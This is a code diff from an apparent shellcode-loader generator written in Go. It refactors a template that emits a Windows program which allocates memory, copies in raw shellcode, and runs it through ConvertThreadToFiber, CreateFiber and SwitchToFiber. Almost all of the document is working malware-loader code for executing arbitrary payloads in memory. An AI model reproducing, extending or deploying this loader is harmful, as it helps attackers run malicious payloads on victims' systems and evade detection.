@@ -2,20 +2,23 @@ package loaders
 
 import (
 	"fmt"
+	"strings"
 )
 
-func GetCreateFiberTemplate(targetProcess string) string {
-	InformProcessUnused(targetProcess)
+type CreateFiberTemplate struct{}
 
+func (t CreateFiberTemplate) Import() string {
 	return fmt.Sprintf(`
-package main
-
 import (
 	"os"
 	"unsafe"
     "syscall"
 )
+`)
+}
 
+func (t CreateFiberTemplate) Const() string {
+	return fmt.Sprintf(`
 const (
 	MEM_COMMIT          = 0x1000
 	MEM_RESERVE         = 0x2000
@@ -35,10 +38,16 @@ var (
 	SwitchToFiber           = kernel32.MustFindProc("SwitchToFiber")
     RtlCopyMemory           = ntdll.MustFindProc("RtlCopyMemory")
 )
+`)
+}
 
-func ExecuteOrderSixtySix(shellcode []byte) {
+func (t CreateFiberTemplate) Init() string {
+	return ""
+}
 
-    /* convert main thread to fiber */
+func (t CreateFiberTemplate) Process() string {
+	return fmt.Sprintf(`
+	/* convert main thread to fiber */
 	fiberAddr, _, _ := ConvertThreadToFiber.Call()
     if fiberAddr == 0 {
         os.Exit(1)
@@ -60,7 +69,29 @@ func ExecuteOrderSixtySix(shellcode []byte) {
     /* call CreateFiber & switch to the fiber to execute the payload */
     fiber, _, _ := CreateFiber.Call(0, addr, 0)
 	_, _, _ = SwitchToFiber.Call(fiber)
+`)
+}
+
+func (t CreateFiberTemplate) GetTemplate(targetProcess string) string {
+	InformProcessUnused(targetProcess)
+
+	var template = `
+package main
+
+__IMPORT__STATEMENT__
+
+__CONST__STATEMENT__
+
+func ExecuteOrderSixtySix(shellcode []byte) {
+
+__IMPORT__PROCESS__
 
 }
-    `)
+`
+	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
+	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
+	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
+	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)
+
+	return template
 }
